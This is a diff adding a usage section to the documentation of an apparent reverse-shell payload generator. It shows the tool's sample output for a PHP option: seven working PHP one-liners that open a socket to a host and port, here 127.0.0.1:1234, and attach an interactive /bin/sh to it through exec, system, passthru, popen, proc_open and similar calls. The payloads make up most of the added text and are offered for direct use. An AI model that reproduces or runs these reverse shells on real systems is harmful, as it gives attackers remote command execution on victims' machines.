@@ -66,3 +66,27 @@ appear the number for payloads
 > 
 ```
 
+choise the number and then display the payload and that's included host and ports from args
+
+```
+[+]Select the Number of payload
+> 16
+[>]Selected: php
+
+    php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);`/bin/sh -i <&3 >&3 2>&3`;'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);system("/bin/sh -i <&3 >&3 2>&3");'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);passthru("/bin/sh -i <&3 >&3 2>&3");'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+    
+    php -r '$sock=fsockopen("127.0.0.1",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+    
+$ 
+
+```
